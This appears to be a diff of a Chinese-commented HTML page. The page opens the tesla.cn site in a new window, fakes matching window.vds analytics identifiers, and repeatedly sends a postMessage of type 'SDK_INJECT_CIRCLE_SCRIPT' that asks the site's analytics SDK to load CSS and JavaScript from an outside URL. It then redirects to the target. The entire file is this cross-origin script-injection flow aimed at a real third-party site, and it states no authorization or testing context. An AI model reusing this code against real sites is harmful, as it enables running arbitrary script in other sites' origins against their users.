@@ -1,90 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>A网站（跨域版）</title>
+    <title>A网站（终极解决方案）</title>
     <meta charset="UTF-8">
 </head>
 <body>
-    <h1>A网站（带旧B窗口加载确认）</h1>
-    <button id="triggerBtn">打开B网站并触发输出</button>
-    <div id="log"></div>
-<script>
+    <h1>A网站（解决source为null问题）</h1>
+    <button id="triggerBtn">发送消息并跳转</button>
+
+    <script>
         const B_ORIGIN = 'https://www.tesla.cn'; // 替换为实际B网站域名
         let bWindow = null;
-        const logEl = document.getElementById('log');
- 
-        // 日志打印
-        const log = (msg) => {
-            logEl.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
-            console.log(msg);
-        };
- 
-        // 核心：等待旧B窗口完全加载完成的工具函数
-        const waitForBWindowLoad = (bWindow, timeout = 10000) => {
-            return new Promise((resolve, reject) => {
-                const timeoutId = setTimeout(() => {
-                    reject(new Error('等待B窗口加载超时'));
-                }, timeout);
- 
-                // 监听B窗口发送的加载完成事件
-                const messageHandler = (event) => {
-                    if (event.origin === B_ORIGIN && event.data.type === 'b_window_loaded') {
-                        window.removeEventListener('message', messageHandler);
-                        clearTimeout(timeoutId);
-                        resolve();
-                    }
-                };
-                window.addEventListener('message', messageHandler);
- 
-                // 轮询检测窗口状态，防止消息丢失
-                const checkInterval = setInterval(() => {
-                    if (bWindow.closed) {
-                        clearInterval(checkInterval);
-                        reject(new Error('B窗口被用户关闭'));
-                    }
+
+        // 关键1：提前定义并冻结vds对象，确保属性不可变
+        window.vds = Object.freeze({
+            projectId: "123456",    // 必须和B的vds.projectId完全一致
+            dataSourceId: "abcdef"  // 必须和B的vds.dataSourceId完全一致
+        });
+
+        document.getElementById('triggerBtn').addEventListener('click', () => {
+            // 打开旧B窗口
+            bWindow = window.open(`${B_ORIGIN}`, '_blank');
+            
+            // 关键2：同步等待B窗口加载完成，确保监听函数已注册
+            const sendMessageImmediately = () => {
+                if (bWindow && !bWindow.closed) {
                     try {
-                        // 尝试访问B窗口的document，加载完成后才不会跨域报错
-                        if (bWindow.document) {
-                            // 主动ping B窗口，触发加载完成确认
-                            bWindow.postMessage({ type: 'ping' }, B_ORIGIN);
-                        }
-                    } catch (e) {
-                        // 跨域报错属于正常现象，说明还在加载中
-                    }
-                }, 2000);
-            });
-        };
- 
-        // A窗口定义vds属性
-        window.vds = 1;
- 
-        document.getElementById('triggerBtn').addEventListener('click', async () => {
-            try {
-                log('开始打开旧B窗口...');
-                bWindow = window.open(`${B_ORIGIN}`, '_blank');
- 
-                log('等待旧B窗口完全加载...');
-                // 等待B窗口加载完成，超时时间10秒
-                await waitForBWindowLoad(bWindow);
-                log('✅ 旧B窗口加载完成，准备发送消息');
- 
-                // 发送业务消息
-                 bWindow.postMessage({
+                        // 先发送ping消息验证通信通道是否可用
+                        bWindow.postMessage({ type: 'ping' }, B_ORIGIN);
+                        
+                        // 立即发送业务消息，同步执行
+                         bWindow.postMessage({
                         type: "SDK_INJECT_CIRCLE_SCRIPT",
                         cssURL:"https://www.example.com/1.css",
                         jsURL:"https://www.example.com/1.js"
                     }, B_ORIGIN); // 这里必须是B的完整域名，不能用'*'
-                log('已向B网站发送触发消息');
- 
-                // 发送完成后立即跳转新B窗口
-                setTimeout(() => {
-                    log('正在跳转到新B窗口...');
-                    window.location.href = `${B_ORIGIN}/b.html?isNew=true`;
-                }, 0);
- 
-            } catch (error) {
-                log(`❌ 流程失败: ${error.message}`);
-            }
+                        
+                        console.log('消息已发送，延迟50ms跳转确保B处理完成');
+                        
+                        // 关键3：极短延迟跳转，给B足够时间处理message事件
+                        // 50ms远小于浏览器销毁页面上下文的时间，完全不影响用户体验
+                        setTimeout(() => {
+                            window.location.href = `${B_ORIGIN}`;
+                        }, 50);
+                        
+                    } catch (e) {
+                        // B窗口还在加载，重试
+                        setTimeout(sendMessageImmediately, 30);
+                    }
+                }
+            };
+            sendMessageImmediately();
         });
     </script>
 </body>
